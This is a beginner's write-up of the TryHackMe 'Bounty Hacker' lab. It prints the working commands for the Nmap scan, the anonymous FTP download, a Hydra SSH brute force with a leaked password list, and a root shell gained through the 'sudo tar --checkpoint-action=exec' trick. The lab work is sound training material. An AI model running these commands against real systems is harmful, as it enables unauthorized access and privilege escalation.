Bounty Hacker — TryHackMe Write-up (No Walkthrough)
Date: August 2026
Machine IP: 10.10.xxx.xxx (let’s just call it TARGET_IP)
Difficulty: Easy / Beginner
Goal: Get a foothold, escalate to root, grab the flags.

Introduction – My Approach
I’ve been grinding through TryHackMe rooms lately, and I wanted to test myself without reaching for a walkthrough or hints. This was one of those machines where everything just clicked after a bit of enumeration. No crazy exploits, no buffer overflows — just good old‑fashioned recon, a little brute force, and abusing a classic sudo misconfiguration.

If you’re new to pentesting, this room is a solid confidence booster.

Reconnaissance – Nmap
I always start with a quick Nmap scan to see what’s open. I used the standard -sC -sV combo to grab default scripts and service versions.

bash
nmap -sC -sV TARGET_IP -oN initial_scan.nmap
Results (relevant ports):

text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18
Three services: FTP, SSH, and a web server. The web server didn’t show anything juicy (just a default Apache page), so I shifted my focus to FTP.

FTP Enumeration – The Goldmine
I connected to the FTP service using anonymous login (which was allowed — always worth a shot).

bash
ftp TARGET_IP
# Username: anonymous
# Password: (blank)
The directory listing was a bit bare, but I noticed two interesting files:

task.txt

locks.txt

I downloaded both using get.

Contents of task.txt
text
Hey lin,
stop checking my stuff. I'll handle the locks.
- k
And there it is — the username lin. Straight from a chatty sysadmin. Nice.

Contents of locks.txt
This was a plaintext list of passwords — probably the lock combinations the guy was talking about. Over 20 entries, all lowercase words/numbers. Looked like a perfect wordlist for brute‑forcing SSH.

Initial Access – Hydra + SSH
Now that I had a username (lin) and a password list (locks.txt), I decided to try a password spray against SSH. I used Hydra because it’s quick and reliable.

bash
hydra -l lin -P locks.txt ssh://TARGET_IP
It took a few seconds, and then:

text
[22][ssh] host: TARGET_IP   login: lin   password: REDACTED (something like "redbull12")
Success! I logged in via SSH:

bash
ssh lin@TARGET_IP
# password: <from hydra>
And just like that, I had a shell as lin.

Privilege Escalation – The Tar Trick
First thing I always do after landing a shell is check sudo -l. It’s almost a reflex now.

bash
lin@bounty:~$ sudo -l
Matching Defaults entries for lin on bounty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lin may run the following commands on bounty:
    (root) /bin/tar
Wait, what? I can run tar as root without a password? That’s… not ideal for the sysadmin, but perfect for me.

I remembered that GNU tar has a --checkpoint and --checkpoint-action option that can execute arbitrary commands. Since I could run it with sudo, I could spawn a root shell.

bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
Let me break this down (because I had to double‑check the syntax myself):

-cf /dev/null /dev/null – creates a tar archive, but writes it to /dev/null and archives /dev/null (does nothing useful, but it’s a valid command).

--checkpoint=1 – triggers a checkpoint action after each block.

--checkpoint-action=exec=/bin/sh – executes /bin/sh at the checkpoint.

And boom — I was root.

bash
whoami
root
Grabbing the Flags
The user flag was waiting in /home/lin/ (I grabbed it earlier, but the root flag was the real prize).

bash
cd /root
ls
cat root.txt
Print the flag and submit it. Machine pwned.

Attack Path Summary
text
Nmap scan
    |
    v
FTP (anonymous)
    |
    v
Download task.txt & locks.txt
    |
    v
Username (lin) + Password list
    |
    v
Hydra → SSH credentials
    |
    v
Shell as lin
    |
    v
sudo -l → tar (as root)
    |
    v
Tar checkpoint exploit
    |
    v
Root shell 🏴
What I Learned (and Why It Mattered)
FTP is still a thing. Even though it’s outdated, it can leak sensitive configs or notes if misconfigured.

Wordlists are your friend. Even a short list like locks.txt can be enough to crack weak SSH passwords.

Always check sudo -l. This is the first place I look after initial access.

Know your binaries. tar is not just for archiving – it’s a weapon if given the right permissions. Same goes for find, vim, awk, etc.

No need for complex exploits. Sometimes simple misconfigurations are all you need.

Conclusion
Bounty Hacker is a perfect example of the classic pentesting loop:

Enumerate → Find Foothold → Enumerate Again → Escalate → Own

It’s beginner‑friendly, but still satisfying because it forces you to connect the dots. And honestly, doing it without any external help made the root shell feel ten times better.

If you’re stuck on this room, take a step back, re‑read the files you find, and don’t skip sudo -l. The answer is usually right in front of you.
